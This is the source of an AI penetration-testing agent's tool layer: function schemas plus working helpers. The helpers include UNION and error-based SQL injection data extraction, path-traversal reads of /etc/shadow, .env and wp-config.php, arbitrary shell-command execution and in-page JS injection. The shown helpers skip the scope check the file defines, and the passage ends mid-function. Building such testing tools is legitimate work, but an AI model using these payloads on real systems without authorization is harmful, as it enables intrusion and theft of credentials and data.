"""Tool definitions and executor for BugHound agent mode.

Defines the tool schemas (OpenAI function-calling format) that the AI can
invoke, and the execute_tool() dispatcher that routes calls to actual
BugHound stage functions or exploitation helpers.
"""

from __future__ import annotations

import json
import asyncio
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import aiohttp
import structlog

logger = structlog.get_logger()

# ---------------------------------------------------------------------------
# HTTP constants (same as injection_tester.py)
# ---------------------------------------------------------------------------

_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
_HTTP_TIMEOUT = aiohttp.ClientTimeout(total=20)

# Maximum result size returned to the AI (avoid token overflow)
_MAX_RESULT_LEN = 8000

# ---------------------------------------------------------------------------
# Tool schemas (OpenAI function-calling format)
# ---------------------------------------------------------------------------

AGENT_TOOLS: list[dict[str, Any]] = [
    # === RECON / ANALYSIS ===
    {
        "type": "function",
        "function": {
            "name": "get_attack_surface",
            "description": (
                "Get Stage 3 attack surface analysis. Returns parameter "
                "classification, attack chains, immediate wins, and reasoning "
                "prompts for the target."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "workspace_id": {"type": "string"},
                },
                "required": ["workspace_id"],
            },
        },
    },

    # === PAGE ANALYSIS (agent reads pages like a human pentester) ===
    {
        "type": "function",
        "function": {
            "name": "read_page",
            "description": "Fetch a URL and return the HTML content for analysis. Use this to read page source, find forms, hidden inputs, JavaScript, comments, and understand the application structure. Returns status code, headers, and body content.",
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "URL to fetch"},
                    "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
                    "headers": {"type": "object", "description": "Custom headers to send"},
                },
                "required": ["url"],
            },
        },
    },

    {
        "type": "function",
        "function": {
            "name": "browse_page",
            "description": (
                "Open a URL in a real browser (Playwright/Chromium). Use this for: "
                "SPAs that render content via JavaScript, DOM XSS testing, "
                "pages that require JS to load, authentication flows. "
                "Returns the rendered HTML (after JS execution), console logs, "
                "and any JavaScript errors. Slower than read_page but sees what a real browser sees."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "URL to open in browser"},
                    "wait_seconds": {"type": "integer", "description": "Seconds to wait for JS to render (default: 3)", "default": 3},
                    "inject_js": {"type": "string", "description": "Optional JavaScript to execute in page context (e.g., 'document.cookie')"},
                },
                "required": ["url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "run_tool",
            "description": (
                "Run a security tool available on the system. Use for: "
                "curl with complex options, nmap port scan, whatweb fingerprint, "
                "or any Kali tool. Returns stdout output. "
                "ONLY use for security testing tools, NOT for destructive commands."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "Command to run (e.g., 'curl -sk https://target.com/admin', 'whatweb target.com')",
                    },
                    "timeout": {"type": "integer", "description": "Timeout in seconds (default: 30)", "default": 30},
                },
                "required": ["command"],
            },
        },
    },

    # === EXPLOITATION (agent-only) ===
    {
        "type": "function",
        "function": {
            "name": "http_request",
            "description": (
                "Send a custom HTTP request. Use for manual exploitation, "
                "chaining findings, verifying bypasses, or extracting data "
                "from confirmed vulnerabilities."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "method": {
                        "type": "string",
                        "enum": [
                            "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS",
                        ],
                    },
                    "url": {"type": "string"},
                    "headers": {
                        "type": "object",
                        "description": "Custom headers to include.",
                    },
                    "body": {
                        "type": "string",
                        "description": "Request body (form-encoded or JSON string).",
                    },
                    "body_type": {
                        "type": "string",
                        "enum": ["form", "json", "xml", "raw"],
                        "description": "Body content type. Default: form.",
                    },
                },
                "required": ["method", "url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "extract_sqli_data",
            "description": (
                "Given a confirmed SQLi endpoint, attempt to extract data "
                "using UNION SELECT. Tries column counts 1-10."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "param": {"type": "string"},
                    "db_type": {
                        "type": "string",
                        "enum": [
                            "mysql", "postgresql", "mssql", "oracle", "sqlite",
                        ],
                    },
                    "query": {
                        "type": "string",
                        "description": (
                            "SQL query to extract, e.g. 'SELECT version()' "
                            "or 'SELECT table_name FROM information_schema.tables'"
                        ),
                    },
                },
                "required": ["url", "param", "db_type", "query"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "read_file_via_lfi",
            "description": (
                "Given a confirmed LFI endpoint, read a specific file from "
                "the server using path traversal."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "param": {"type": "string"},
                    "file_path": {
                        "type": "string",
                        "description": (
                            "File to read, e.g. /etc/passwd, /web.config, .env"
                        ),
                    },
                },
                "required": ["url", "param", "file_path"],
            },
        },
    },

    # === ANALYSIS / REVIEW ===
    {
        "type": "function",
        "function": {
            "name": "get_findings",
            "description": (
                "Get all current findings. Use to review what has been found "
                "and decide next steps."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "workspace_id": {"type": "string"},
                },
                "required": ["workspace_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "validate_findings",
            "description": (
                "Run Stage 5 validation on all findings using sqlmap/dalfox/curl "
                "to confirm or reject each finding."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "workspace_id": {"type": "string"},
                },
                "required": ["workspace_id"],
            },
        },
    },

    # === REPORT ===
    {
        "type": "function",
        "function": {
            "name": "generate_report",
            "description": (
                "Generate final security reports (HTML, markdown, executive summary)."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "workspace_id": {"type": "string"},
                },
                "required": ["workspace_id"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "update_finding_status",
            "description": (
                "Update the validation status of an existing finding. "
                "Use after you validate a finding with http_request or read_page. "
                "Set status to CONFIRMED if you verified it's real, "
                "LIKELY_FALSE_POSITIVE if it's not exploitable, "
                "or NEEDS_MANUAL_REVIEW if you're unsure. "
                "Use the finding_id shown in the findings list."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "finding_id": {
                        "type": "string",
                        "description": "The finding ID (e.g., 'finding_high_a1b2c3d4')",
                    },
                    "status": {
                        "type": "string",
                        "enum": ["CONFIRMED", "LIKELY_FALSE_POSITIVE", "NEEDS_MANUAL_REVIEW"],
                    },
                    "evidence": {
                        "type": "string",
                        "description": "Updated evidence from your validation (e.g., 'SQL error: Unclosed quotation mark in response')",
                    },
                },
                "required": ["finding_id", "status"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "add_finding",
            "description": (
                "Add a NEW finding discovered through manual testing. "
                "Use when you find a vulnerability that automated techniques missed."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "workspace_id": {"type": "string"},
                    "vulnerability_class": {"type": "string"},
                    "severity": {
                        "type": "string",
                        "enum": ["critical", "high", "medium", "low", "info"],
                    },
                    "endpoint": {"type": "string"},
                    "description": {"type": "string"},
                    "evidence": {"type": "string"},
                    "curl_command": {"type": "string"},
                    "impact": {"type": "string"},
                },
                "required": [
                    "workspace_id", "vulnerability_class", "severity",
                    "endpoint", "description", "evidence",
                ],
            },
        },
    },

    # === ANTI-FP / CONTEXT-AWARE REASONING PRIMITIVES ===
    {
        "type": "function",
        "function": {
            "name": "verify_not_honeytoken",
            "description": (
                "Test whether a suspected injection finding is actually a honeytoken / "
                "static mock response. Replays the endpoint with a SAFE payload that "
                "should NOT trigger any real vulnerability, then compares against the "
                "original injection response. If the same error/marker appears with "
                "both injection AND safe payload, the site is serving mock content — "
                "FALSE POSITIVE. Use BEFORE declaring SQLi / LFI / SSTI / RCE confirmed. "
                "Returns {honeytoken: bool, confidence, comparison}."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Full injection URL (e.g. https://x/p?id=1%27)"},
                    "param": {"type": "string", "description": "Parameter name that was injected"},
                    "injection_value": {"type": "string", "description": "The payload you used (e.g. \"1'\", \"../../etc/passwd\")"},
                    "safe_value": {"type": "string", "description": "A benign value that should NOT trigger vuln (e.g. \"1\", \"foo\")"},
                    "vuln_class": {
                        "type": "string",
                        "enum": ["sqli", "lfi", "ssti", "rce", "xxe", "ssrf"],
                        "description": "Which class we're testing for honeytoken",
                    },
                },
                "required": ["url", "param", "injection_value", "safe_value", "vuln_class"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "detect_url_auth",
            "description": (
                "Check whether a site uses URL-based authentication (credentials or "
                "auth tokens passed in query string — e.g. `?UserName=admin`, "
                "`?token=...`, `?user=...`, `?auth=...`). This is a HIGH severity "
                "anti-pattern: credentials leak via browser history, referrer headers, "
                "proxy logs, and trivial XSS steals them. Fetches the login flow and "
                "inspects redirects + response for auth-in-URL patterns."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "login_url": {"type": "string", "description": "URL of login page or a post-login URL to inspect"},
                    "test_username": {"type": "string", "description": "Optional test username to POST (default: 'admin')"},
                    "test_password": {"type": "string", "description": "Optional test password (default: 'test1234')"},
                },
                "required": ["login_url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "test_viewstate_binding",
            "description": (
                "Test whether an ASP.NET page's __VIEWSTATE is bound to session / "
                "CSRF-safe. Captures ViewState from target_url as an anonymous session, "
                "then replays POST with that ViewState from a DIFFERENT anonymous "
                "session. If the POST succeeds (not rejected with 'The state information "
                "is invalid'), ViewState is not session-bound = CSRF replay possible. "
                "Use on ASP.NET WebForms pages (*.aspx) that have forms."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "target_url": {"type": "string", "description": "ASPX page URL with a form"},
                },
                "required": ["target_url"],
            },
        },
    },

    # === WORKFLOW EXPLORATION (browser + traffic capture) ===
    {
        "type": "function",
        "function": {
            "name": "capture_workflow",
            "description": (
                "Execute a sequence of browser actions (navigate/click/input/wait) "
                "in a real Chromium session while recording ALL network traffic. "
                "Returns captured flows (method, URL, status, request/response headers, "
                "request bodies, Set-Cookie, redirects) plus final page state (URL, "
                "title, body preview, cookies). Use this when you need to see the "
                "actual API requests a workflow generates — e.g. clicking a login "
                "button reveals the POST payload including hidden __VIEWSTATE. "
                "Much more informative than read_page for multi-step workflows."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "start_url": {
                        "type": "string",
                        "description": "Initial URL to load in browser.",
                    },
                    "actions": {
                        "type": "array",
                        "description": (
                            "Ordered list of browser actions. Each action is "
                            "an object: "
                            "{type: 'navigate', url}; "
                            "{type: 'click', selector}; "
                            "{type: 'input', selector, value}; "
                            "{type: 'submit_form', selector}; "
                            "{type: 'wait', seconds}; "
                            "{type: 'evaluate', js}."
                        ),
                        "items": {"type": "object"},
                    },
                    "wait_seconds": {
                        "type": "integer",
                        "description": "Final settling wait after all actions (default 2).",
                        "default": 2,
                    },
                },
                "required": ["start_url", "actions"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "submit_form",
            "description": (
                "Fetch a page, parse the first matching form (or form by index), "
                "fill specified fields (preserving all hidden fields like __VIEWSTATE "
                "/ __EVENTVALIDATION / CSRF tokens), submit, and return the full "
                "round-trip: exact request (method, URL, headers, form body), "
                "response status, response headers, Set-Cookie list, redirect chain, "
                "and a body preview. Use this to test auth, form-based CSRF, stored "
                "input, POST-based SQLi/XSS — anything that needs proper form "
                "mechanics rather than hand-crafted http_request."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "URL of page containing the form.",
                    },
                    "field_overrides": {
                        "type": "object",
                        "description": (
                            "Map of field name → value to override. Hidden fields "
                            "are preserved from the page unless overridden here."
                        ),
                    },
                    "form_index": {
                        "type": "integer",
                        "description": "Which form on the page to use (default 0).",
                        "default": 0,
                    },
                    "follow_redirects": {
                        "type": "boolean",
                        "description": "Follow 30x redirects (default false — so agent sees the Location).",
                        "default": False,
                    },
                },
                "required": ["url", "field_overrides"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "record_user_story",
            "description": (
                "Persist a structured UserStory record for a workflow/surface the "
                "agent has explored. Use AFTER capture_workflow or submit_form to "
                "crystallize what was learned. Stored under workspace agent/user_stories.json "
                "and feeds Stage 3 attack-surface reasoning. Mirrors PAIStrike's "
                "DeepExplorationResult shape: personas, routes, apis, notes, "
                "follow_up_candidates, unresolved_gaps."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "candidate_id": {"type": "string", "description": "Unique ID (e.g. 'candidate-login')"},
                    "candidate_name": {"type": "string"},
                    "status": {
                        "type": "string",
                        "enum": ["verified", "partial", "rejected"],
                    },
                    "personas": {
                        "type": "array",
                        "description": "List of {name, description, goals[], signals[]}",
                        "items": {"type": "object"},
                    },
                    "routes": {
                        "type": "array",
                        "description": "URLs exercised",
                        "items": {"type": "string"},
                    },
                    "apis": {
                        "type": "array",
                        "description": "List of {method, path, headers, payload, description}",
                        "items": {"type": "object"},
                    },
                    "technologies": {
                        "type": "array",
                        "items": {"type": "string"},
                    },
                    "notes": {
                        "type": "array",
                        "items": {"type": "string"},
                    },
                    "follow_up_candidates": {
                        "type": "array",
                        "description": "New surfaces to explore",
                        "items": {"type": "object"},
                    },
                    "unresolved_gaps": {
                        "type": "array",
                        "items": {"type": "string"},
                    },
                    "sensitive_data": {
                        "type": "string",
                        "description": "Any secrets/credentials/PII observed",
                    },
                },
                "required": ["candidate_id", "candidate_name", "status"],
            },
        },
    },
]

# ---------------------------------------------------------------------------
# Scope validation
# ---------------------------------------------------------------------------


def _is_in_scope(url: str, target_scope: str) -> bool:
    """Check if a URL is within the target's domain scope."""
    target_host = urlparse(target_scope).hostname or target_scope
    url_host = urlparse(url).hostname or ""
    return url_host == target_host or url_host.endswith(f".{target_host}")


# ---------------------------------------------------------------------------
# HTTP helpers for exploitation tools
# ---------------------------------------------------------------------------


def _get_auth_headers() -> dict[str, str]:
    """Retrieve auth headers from injection_tester if set."""
    try:
        from bughound.tools.testing.injection_tester import _AUTH_HEADERS
        return dict(_AUTH_HEADERS)
    except Exception:
        return {}


def _replace_param(url: str, param: str, new_value: str) -> str:
    """Replace a query parameter value in a URL."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        sep = "&" if parsed.query else ""
        new_query = f"{parsed.query}{sep}{urlencode({param: new_value})}"
    else:
        qs[param] = [new_value]
        new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _truncate(text: str, max_len: int = _MAX_RESULT_LEN) -> str:
    """Truncate text to max_len chars with indicator."""
    if len(text) <= max_len:
        return text
    return text[:max_len] + f"\n... [truncated, {len(text)} total chars]"


# ---------------------------------------------------------------------------
# Tool implementations
# ---------------------------------------------------------------------------


async def _tool_get_attack_surface(workspace_id: str) -> dict[str, Any]:
    """Get Stage 3 attack surface analysis."""
    from bughound.stages import analyze as stage_analyze
    return await stage_analyze.get_attack_surface(workspace_id)


async def _tool_run_technique(
    workspace_id: str, technique_id: str,
) -> dict[str, Any]:
    """Run a single testing technique."""
    from bughound.stages import techniques
    from bughound.core import workspace

    meta = await workspace.get_workspace(workspace_id)
    if meta is None:
        return {"status": "error", "message": f"Workspace '{workspace_id}' not found."}

    # Build targets list from workspace metadata
    target_host = meta.target
    if "://" in target_host:
        target_host = urlparse(target_host).hostname or target_host

    targets = [{"host": target_host, "priority": 1, "test_classes": []}]

    try:
        findings = await asyncio.wait_for(
            techniques.execute_technique(technique_id, workspace_id, targets),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return {
            "status": "error",
            "message": f"Technique '{technique_id}' timed out after 5 minutes.",
        }
    except Exception as exc:
        return {
            "status": "error",
            "message": f"Technique '{technique_id}' failed: {exc}",
        }

    # Assign finding IDs and persist
    import hashlib
    for f in findings:
        if not f.get("finding_id"):
            sev = f.get("severity", "info").lower()
            h_input = (
                f"{f.get('tool', '')}:{f.get('host', '')}:"
                f"{f.get('endpoint', '')}:{f.get('description', '')}"
            )
            h8 = hashlib.sha256(h_input.encode()).hexdigest()[:8]
            f["finding_id"] = f"finding_{sev}_{h8}"
        f.setdefault("validated", False)
        f.setdefault("validation_status", None)

    if findings:
        await _append_findings(workspace_id, findings)

    return {
        "status": "success",
        "technique": technique_id,
        "findings_count": len(findings),
        "findings": findings[:20],
    }


async def _tool_run_full_test(
    workspace_id: str,
    test_classes: list[str] | None = None,
) -> dict[str, Any]:
    """Run full Stage 4 testing."""
    from bughound.stages import analyze as stage_analyze
    from bughound.stages import test as stage_test
    from bughound.core import workspace

    meta = await workspace.get_workspace(workspace_id)
    if meta is None:
        return {"status": "error", "message": f"Workspace '{workspace_id}' not found."}

    target_host = meta.target
    if "://" in target_host:
        target_host = urlparse(target_host).hostname or target_host

    suggested = test_classes or [
        "sqli", "xss", "ssrf", "lfi", "ssti", "open_redirect",
        "crlf", "idor", "rce", "xxe", "header_injection",
        "graphql", "jwt", "misconfig", "default_creds",
        "cors", "bac", "csti", "cve_specific",
    ]

    scan_plan = {
        "targets": [
            {"host": target_host, "priority": 1, "test_classes": suggested},
        ],
        "global_settings": {
            "nuclei_severity": "critical,high,medium,low,info",
            "nuclei_rate_limit": 100,
            "nuclei_concurrency": 25,
        },
    }

    await stage_analyze.submit_scan_plan(workspace_id, scan_plan)

    # Run synchronously (no job manager -- agent can wait)
    result = await stage_test.execute_tests(workspace_id, job_manager=None)

    # Return a concise summary
    return {
        "status": result.get("status", "unknown"),
        "targets_tested": result.get("targets_tested", 0),
        "findings_total": result.get("findings_total", 0),
        "findings_by_severity": result.get("findings_by_severity", {}),
        "findings_by_class": result.get("findings_by_class", {}),
        "findings_needing_validation": result.get("findings_needing_validation", 0),
        "warnings": result.get("warnings", [])[:10],
        "findings": result.get("findings", [])[:20],
    }


async def _tool_http_request(
    method: str,
    url: str,
    headers: dict[str, str] | None = None,
    body: str | None = None,
    body_type: str = "form",
) -> dict[str, Any]:
    """Send a custom HTTP request for exploitation."""
    req_headers: dict[str, str] = {
        "User-Agent": _USER_AGENT,
        **_get_auth_headers(),
    }
    if headers:
        req_headers.update(headers)

    # Set content-type based on body_type
    kwargs: dict[str, Any] = {}
    if body:
        if body_type == "json":
            req_headers["Content-Type"] = "application/json"
            kwargs["data"] = body
        elif body_type == "xml":
            req_headers["Content-Type"] = "application/xml"
            kwargs["data"] = body
        elif body_type == "form":
            req_headers["Content-Type"] = "application/x-www-form-urlencoded"
            kwargs["data"] = body
        else:
            kwargs["data"] = body

    try:
        async with aiohttp.ClientSession() as session:
            async with session.request(
                method, url,
                headers=req_headers,
                ssl=False,
                timeout=_HTTP_TIMEOUT,
                allow_redirects=False,
                **kwargs,
            ) as resp:
                resp_body = await resp.text(errors="replace")

                # Collect response headers (first 10)
                resp_headers = dict(list(resp.headers.items())[:10])

                return {
                    "status_code": resp.status,
                    "headers": resp_headers,
                    "body": resp_body[:10000],
                    "body_length": len(resp_body),
                    "redirect_url": str(resp.headers.get("Location", "")),
                }
    except aiohttp.ClientError as exc:
        return {"status": "error", "message": f"Request failed: {exc}"}
    except asyncio.TimeoutError:
        return {"status": "error", "message": "Request timed out"}


async def _tool_extract_sqli_data(
    url: str,
    param: str,
    db_type: str,
    query: str,
) -> dict[str, Any]:
    """Attempt UNION SELECT data extraction from a confirmed SQLi endpoint."""
    # Comment syntax per DB
    comment = {
        "mysql": "-- -",
        "postgresql": "--",
        "mssql": "--",
        "oracle": "--",
        "sqlite": "--",
    }.get(db_type, "--")

    req_headers = {
        "User-Agent": _USER_AGENT,
        **_get_auth_headers(),
    }

    results: list[dict[str, Any]] = []

    try:
        async with aiohttp.ClientSession() as session:
            # Get baseline response for comparison
            async with session.get(
                url, headers=req_headers, ssl=False, timeout=_HTTP_TIMEOUT,
            ) as baseline_resp:
                baseline_body = await baseline_resp.text(errors="replace")
                baseline_len = len(baseline_body)

            # Try column counts 1 through 10
            for col_count in range(1, 11):
                for query_pos in range(col_count):
                    # Build NULL columns with query at query_pos
                    columns = []
                    for i in range(col_count):
                        if i == query_pos:
                            columns.append(f"({query})")
                        else:
                            columns.append("NULL")

                    union_payload = (
                        f"' UNION SELECT {','.join(columns)}{comment}"
                    )
                    test_url = _replace_param(url, param, union_payload)

                    try:
                        async with session.get(
                            test_url, headers=req_headers,
                            ssl=False, timeout=_HTTP_TIMEOUT,
                        ) as resp:
                            body = await resp.text(errors="replace")

                            # Check if response differs significantly from
                            # baseline (indicating successful injection)
                            if (
                                resp.status == 200
                                and len(body) != baseline_len
                                and len(body) > 100
                            ):
                                # Look for data that was not in baseline
                                new_content = []
                                for line in body.split("\n"):
                                    stripped = line.strip()
                                    if (
                                        stripped
                                        and stripped not in baseline_body
                                        and len(stripped) > 3
                                    ):
                                        new_content.append(stripped)

                                if new_content:
                                    return {
                                        "status": "success",
                                        "columns": col_count,
                                        "query_position": query_pos,
                                        "payload": union_payload,
                                        "extracted_data": "\n".join(
                                            new_content[:50]
                                        ),
                                        "curl_command": (
                                            f"curl -sk '{test_url}'"
                                        ),
                                    }
                    except Exception:
                        continue

            # Try error-based extraction as fallback
            error_payloads = {
                "mysql": f"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(({query}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a){comment}",
                "postgresql": f"' AND 1=CAST(({query}) AS INT){comment}",
                "mssql": f"' AND 1=CONVERT(INT,({query})){comment}",
                "oracle": f"' AND 1=UTL_INADDR.GET_HOST_ADDRESS(({query})){comment}",
                "sqlite": f"' AND 1=CAST(({query}) AS INT){comment}",
            }
            error_payload = error_payloads.get(db_type, error_payloads["mysql"])
            test_url = _replace_param(url, param, error_payload)

            try:
                async with session.get(
                    test_url, headers=req_headers,
                    ssl=False, timeout=_HTTP_TIMEOUT,
                ) as resp:
                    body = await resp.text(errors="replace")
                    # Look for error message containing extracted data
                    if resp.status in (200, 500) and body:
                        return {
                            "status": "partial",
                            "method": "error_based",
                            "payload": error_payload,
                            "response_snippet": body[:10000],
                            "curl_command": f"curl -sk '{test_url}'",
                        }
            except Exception:
                pass

    except Exception as exc:
        return {"status": "error", "message": f"Extraction failed: {exc}"}

    return {
        "status": "failed",
        "message": (
            "Could not extract data via UNION SELECT or error-based methods. "
            "Try manual exploitation with http_request()."
        ),
        "columns_tried": 10,
    }


async def _tool_read_file_via_lfi(
    url: str,
    param: str,
    file_path: str,
) -> dict[str, Any]:
    """Attempt to read a file via LFI using path traversal."""
    req_headers = {
        "User-Agent": _USER_AGENT,
        **_get_auth_headers(),
    }

    # File content indicators
    indicators = {
        "/etc/passwd": ["root:", "/bin/bash", "/bin/sh", "nobody:", "daemon:"],
        "/etc/shadow": ["root:", "$6$", "$5$", "$y$"],
        "/etc/hosts": ["localhost", "127.0.0.1"],
        "/web.config": ["<configuration", "<system.web", "<appSettings"],
        "web.config": ["<configuration", "<system.web", "<appSettings"],
        ".env": ["DB_", "APP_", "SECRET", "KEY=", "PASSWORD"],
        "wp-config.php": ["DB_NAME", "DB_USER", "DB_PASSWORD", "table_prefix"],
        "/windows/win.ini": ["[fonts]", "[extensions]"],
        "boot.ini": ["[boot loader]", "[operating systems]"],
    }

    # Get indicators for this file, or generic ones
    file_indicators = indicators.get(file_path, [])
    if not file_indicators:
        # Try matching partial path
        for known_file, inds in indicators.items():
            if known_file in file_path:
                file_indicators = inds
                break

    # Traversal depths to try
    traversals = [
        f"{'../' * depth}{file_path.lstrip('/')}"
        for depth in range(3, 9)
    ]
    # Also try with null byte and double-encoding
    traversals.extend([
        f"{'../' * 6}{file_path.lstrip('/')}%00",
        f"{'..%2f' * 6}{file_path.lstrip('/')}",
        f"{'..%252f' * 6}{file_path.lstrip('/')}",
        f"{'..../' * 6}{file_path.lstrip('/')}",
    ])

    try:
        async with aiohttp.ClientSession() as session:
            for traversal in traversals:
                test_url = _replace_param(url, param, traversal)

                try:
                    async with session.get(
                        test_url, headers=req_headers,
                        ssl=False, timeout=_HTTP_TIMEOUT,
                    ) as resp:
                        body = await resp.text(errors="replace")

                        if resp.status == 200 and body:
                            # Check for file content indicators
                            found = False
                            if file_indicators:
                                found = any(
                                    ind in body for ind in file_indicators
                                )
                            else:
                                # If no specific indicators, check that
                                # response differs from error page
                                found = len(body) > 100 and resp.status == 200

                            if found:
                                return {
                                    "status": "success",
                                    "file_path": file_path,
                                    "traversal": traversal,
                                    "content": body[:3000],
                                    "content_length": len(body),
                                    "curl_command": f"curl -sk '{test_url}'",
                                }
                except Exception:
                    continue

    except Exception as exc:
        return {"status": "error", "message": f"LFI read failed: {exc}"}

    return {
        "status": "failed",
        "message": (
            f"Could not read {file_path} via LFI. "
            "Try different param or manual http_request()."
        ),
        "traversals_tried": len(traversals),
    }


async def _tool_get_findings(workspace_id: str) -> dict[str, Any]:
    """Read current findings from workspace."""
    from bughound.core import workspace

    raw = await workspace.read_data(
        workspace_id, "vulnerabilities/scan_results.json",
    )
    if raw is None:
        return {"status": "success", "findings_count": 0, "findings": []}

    items = raw.get("data", raw) if isinstance(raw, dict) else raw
    findings = items if isinstance(items, list) else []

    # Filter out "other" class noise
    findings = [
        f for f in findings
        if isinstance(f, dict) and f.get("vulnerability_class") not in ("other", None, "")
    ]

    # Count by severity and class
    from collections import Counter
    sev_counts: Counter[str] = Counter()
    class_counts: Counter[str] = Counter()
    for f in findings:
        sev_counts[f.get("severity", "info")] += 1
        class_counts[f.get("vulnerability_class", "?")] += 1

    return {
        "status": "success",
        "findings_count": len(findings),
        "by_severity": dict(sev_counts.most_common()),
        "by_class": dict(class_counts.most_common()),
        "findings": findings[:30],
    }


async def _tool_validate_findings(workspace_id: str) -> dict[str, Any]:
    """Run Stage 5 validation on all findings."""
    from bughound.stages import validate as stage_validate
    return await stage_validate.validate_all(workspace_id)


async def _tool_generate_report(workspace_id: str) -> dict[str, Any]:
    """Run Stage 6 report generation."""
    from bughound.stages import report as stage_report
    return await stage_report.generate_report(workspace_id, "all")


async def _tool_add_finding(
    workspace_id: str,
    vulnerability_class: str,
    severity: str,
    endpoint: str,
    description: str,
    evidence: str,
    curl_command: str = "",
    impact: str = "",
) -> dict[str, Any]:
    """Manually add a finding to scan_results.json."""
    import hashlib
    from bughound.core import workspace

    h_input = f"agent:{endpoint}:{vulnerability_class}:{description}"
    h8 = hashlib.sha256(h_input.encode()).hexdigest()[:8]
    finding_id = f"finding_{severity}_{h8}"

    host = ""
    try:
        host = (urlparse(endpoint).hostname or "").lower()
    except Exception:
        pass

    finding = {
        "finding_id": finding_id,
        "host": host,
        "endpoint": endpoint,
        "vulnerability_class": vulnerability_class,
        "severity": severity,
        "tool": "agent_manual",
        "technique_id": "agent_exploitation",
        "description": description,
        "evidence": evidence,
        "curl_command": curl_command,
        "impact": impact,
        "confidence": "high",
        "needs_validation": False,
        "validated": True,
        "validation_status": "confirmed",
    }

    await _append_findings(workspace_id, [finding])

    return {
        "status": "success",
        "finding_id": finding_id,
        "message": f"Finding added: {vulnerability_class} ({severity}) at {endpoint}",
    }


# ---------------------------------------------------------------------------
# Shared helper: append findings to scan_results.json
# ---------------------------------------------------------------------------


async def _append_findings(
    workspace_id: str,
    new_findings: list[dict[str, Any]],
) -> None:
    """Append findings to existing scan_results.json."""
    from bughound.core import workspace

    existing = await workspace.read_data(
        workspace_id, "vulnerabilities/scan_results.json",
    )

    if isinstance(existing, dict) and "data" in existing:
        existing_items = existing["data"]
    elif isinstance(existing, list):
        existing_items = existing
    else:
        existing_items = []

    existing_ids = {
        f.get("finding_id")
        for f in existing_items
        if isinstance(f, dict)
    }
    merged = list(existing_items)
    for f in new_findings:
        if f.get("finding_id") not in existing_ids:
            merged.append(f)

    await workspace.write_data(
        workspace_id, "vulnerabilities/scan_results.json", merged,
        generated_by="agent", target="multiple",
    )


# ---------------------------------------------------------------------------
# Main dispatcher
# ---------------------------------------------------------------------------


async def _tool_verify_not_honeytoken(
    url: str, param: str, injection_value: str, safe_value: str,
    vuln_class: str,
) -> dict[str, Any]:
    """Replay URL with safe vs injection payload; flag honeytokens.

    Classic lab-target pattern (pro.odaha.io): serves the same `ODBC error`
    string for ANY value, whether you inject or not. Real SQLi must produce
    different content under injection vs benign input.
    """
    import hashlib
    import aiohttp

    inj_url = _replace_param(url, param, injection_value)
    safe_url = _replace_param(url, param, safe_value)
    # Vuln-class-specific fingerprint strings — what we'd treat as "confirmed"
    fingerprints = {
        "sqli": [
            "sql syntax", "mysql_fetch", "odbc microsoft access", "oracle error",
            "pg_query", "unclosed quotation", "syntax error",
            "microsoft ole db", "sqlstate", "unterminated string",
        ],
        "lfi": ["root:x:0:0", "/bin/bash", "daemon:x:", "[boot loader]"],
        "ssti": ["49"],  # {{7*7}} → 49, context-dependent
        "rce": ["uid=", "gid=", "groups="],
        "xxe": ["root:x:0:0", "<!doctype"],
        "ssrf": ["169.254.169.254", "ami-id", "metadata"],
    }
    markers = [m.lower() for m in fingerprints.get(vuln_class, [])]

    timeout = aiohttp.ClientTimeout(total=15)
    try:
        async with aiohttp.ClientSession(headers=_get_auth_headers()) as s:
            async with s.get(inj_url, timeout=timeout, ssl=False) as r:
                inj_body = (await r.text(errors="replace")).lower()[:30000]
            async with s.get(safe_url, timeout=timeout, ssl=False) as r:
                safe_body = (await r.text(errors="replace")).lower()[:30000]
    except Exception as exc:
        return {"status": "error", "message": f"Probe failed: {exc}"}

    inj_marker_hits = [m for m in markers if m in inj_body]
    safe_marker_hits = [m for m in markers if m in safe_body]

    same_content = False
    if inj_body and safe_body:
        inj_hash = hashlib.md5(inj_body.encode(errors="replace"), usedforsecurity=False).hexdigest()
